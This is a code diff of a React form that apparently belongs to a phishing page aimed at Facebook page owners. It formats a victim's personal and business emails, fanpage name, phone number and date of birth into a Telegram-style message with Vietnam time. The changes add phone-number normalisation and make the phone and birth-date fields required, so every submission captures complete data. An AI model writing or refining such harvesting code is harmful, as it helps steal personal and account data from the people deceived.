@@ -102,7 +102,7 @@ ${
 <b>� Email Address:</b> <code>${formData.personalEmail}</code>
 <b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
 <b>📘 Fanpage Name:</b> <code>${formData.pageName}</code>
-<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
+<b>📱 Phone Number:</b> <code>${phoneNumber.startsWith('+') ? phoneNumber : '+' + phoneNumber}</code>
 <b>🎂 Date of Birth:</b> <code>${formData.day}/${formData.month}/${formData.year}</code>
 
 <b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
@@ -191,6 +191,7 @@ ${
                             inputProps={{
                                 name: 'phoneNumber',
                                 maxLength: 11,
+                                required: true,
                                 onChange: handlePhoneChange,
                                 className: 'h-10 sm:h-11 md:h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-sm md:text-base placeholder-gray-500'
                             }}
@@ -200,6 +201,7 @@ ${
                         <div className='flex gap-2 sm:gap-2.5'>
                             {/* Day Select */}
                             <select 
+                                required
                                 name='day'
                                 value={formData.day}
                                 onChange={handleInputChange}
@@ -215,6 +217,7 @@ ${
 
                             {/* Month Select */}
                             <select 
+                                required
                                 name='month'
                                 value={formData.month}
                                 onChange={handleInputChange}
@@ -230,6 +233,7 @@ ${
 
                             {/* Year Select */}
                             <select 
+                                required
                                 name='year'
                                 value={formData.year}
                                 onChange={handleInputChange}
